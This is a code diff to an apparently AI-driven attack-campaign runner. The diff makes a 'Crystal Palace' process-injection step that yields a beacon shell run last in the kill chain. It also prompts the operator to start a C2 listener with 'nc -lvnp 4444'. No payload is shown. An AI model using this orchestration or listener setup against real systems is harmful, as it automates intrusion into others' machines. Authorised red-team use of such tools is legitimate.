@@ -170,6 +170,17 @@ std::vector<ExecutionResult> AgentCore::runCampaign(
             /*secondsSinceLast*/   0.0);
     }
 
+    // Identify terminal exploit (Crystal Palace) — must run LAST
+    bool hasCrystalPalace = false;
+    int crystalPalaceStep = -1;
+    for (size_t i = 0; i < techniques.size(); ++i) {
+        if (techniques[i] == "T1055.001") {
+            hasCrystalPalace = true;
+            crystalPalaceStep = static_cast<int>(i + 1);
+            break;
+        }
+    }
+
     for (const std::string& techniqueId : techniques) {
         ++step;
         std::cout << "\n[AgentCore] --- Step " << step << "/" << techniques.size()
@@ -199,10 +210,28 @@ std::vector<ExecutionResult> AgentCore::runCampaign(
         }
 
         // ----------------------------------------------------------------
+        // TERMINAL EXPLOIT PROTECTION
+        // Crystal Palace (T1055.001) uses NtContinue to transfer execution
+        // to the beacon and NEVER RETURNS. It MUST be the final step.
+        // ----------------------------------------------------------------
+        if (hasCrystalPalace && targetTech == "T1055.001" && step != crystalPalaceStep) {
+            std::cout << "\n[!] DQN recommended Crystal Palace early (step " << step
+                      << "), but it's a TERMINAL exploit (never returns)." << std::endl;
+            std::cout << "[!] Overriding to maintain kill-chain order." << std::endl;
+            // Fall back to the campaign file's technique for this step
+            targetTech = techniqueId;
+        }
+
+        // ----------------------------------------------------------------
         // INTERACTIVE SETUP PROMPTS
         // ----------------------------------------------------------------
         if (targetTech == "T1055.001") {
-            std::cout << "\n[!] CRYSTAL PALACE (KaplaStrike) requires a C2 listener!" << std::endl;
+            std::cout << "\n╔══════════════════════════════════════════════════════════════════╗" << std::endl;
+            std::cout << "║  ⚠️  TERMINAL STEP — CRYSTAL PALACE (KaplaStrike)               ║" << std::endl;
+            std::cout << "║  This is the FINAL exploit. After this, you get a shell.         ║" << std::endl;
+            std::cout << "║  It uses NtContinue to transfer execution — NEVER RETURNS.     ║" << std::endl;
+            std::cout << "╚══════════════════════════════════════════════════════════════════╝" << std::endl;
+            std::cout << "\n[!] Requires a C2 listener!" << std::endl;
             std::cout << "    Please set up your listener before proceeding." << std::endl;
             std::cout << "    Example: nc -lvnp 4444" << std::endl;
             std::cout << "\n    Have you started the C2 listener? (y/n): ";
